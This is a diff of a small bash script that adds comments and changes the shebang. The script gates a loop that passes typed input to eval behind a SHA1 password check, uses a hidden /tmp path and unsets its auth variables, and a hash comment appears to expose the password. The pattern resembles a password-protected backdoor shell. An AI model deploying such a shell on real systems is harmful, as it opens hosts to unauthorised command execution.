@@ -1,10 +1,10 @@
-#!/bin/ash
+#!/bin/bash
 hash="03fed5b990fbc2d64de9085ef9c66d24586b9380" # lolomgwtf
 lolnode=/tmp/.rofl
 
 
 
-killenv(){
+killenv(){ # since we rely on enviromental variables for auth, unset them
 unset $l00s3rshame
 unset $magic
 }
@@ -22,11 +22,11 @@ do
       IFS= read -r -s -p " : " magic && \
       if [[ $(printf "$magic"|sha1sum) == "$hash  -" ]];then
         printf "Access Granted!\n"
-        set authtoken="true"
+        set authtoken="true" # another layer of security (I think)
         while true;do
         if $authtoken;then
-          printf '$ '
-          read cmd
+          printf '$ ' # emulate an interactive shell
+          read cmd # just type bash for a real shell
           eval "$cmd"
         fi
         done
